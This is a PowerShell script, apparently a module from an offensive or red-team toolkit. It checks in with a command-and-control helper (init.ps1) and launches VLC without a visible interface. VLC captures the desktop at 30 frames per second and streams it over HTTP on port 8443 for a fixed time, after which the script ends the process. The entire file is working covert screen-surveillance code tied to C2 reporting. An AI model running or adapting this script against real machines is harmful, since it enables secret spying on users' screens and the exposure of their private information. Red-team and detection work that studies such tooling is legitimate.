#
# Screen capture script
#

# Arguments
param($dest=":8443/stream", $duration=120)
write-host("Listening at: {0}" -f $dest)
write-host("For duration: {0}" -f $duration)

# Checkin to C2
& "$PSScriptRoot\init.ps1" -stage screen-capture -state starting

# Start stream headless using HTTP. Variables will need to be tuned for performance
$duration = 120
& "C:\Program Files (x86)\VideoLAN\VLC\vlc.exe" "--%" "--intf dummy screen://  :screen-fps=30.000000 :live-caching=100 :sout=#transcode{vcodec=h264,acodec=mpga,ab=128,channels=2,samplerate=44100,scodec=none}:http{mux=ffmpeg{mux=flv},dst=$dest} :no-sout-all :sout-keep"
$childProcess = Get-Process vlc
if ($childProcess)
{
    & "$PSScriptRoot\init.ps1" -stage screen-capture -state started -duration "$duration seconds"
    write-host("VLC PID: {0}" -f $childProcess.Id)
    write-host("Sleeping for $duration seconds")
    start-sleep -s $duration
    $stopProcess = Stop-Process -Id $childProcess.Id
    if ($stopProcess -eq $null)
    {
        & "$PSScriptRoot\init.ps1" -stage screen-capture -state complete
    } else
    {
        write-host($stopProcess)
    }
} else
{
    & "$PSScriptRoot\init.ps1" -stage screen-capture -state failed
}
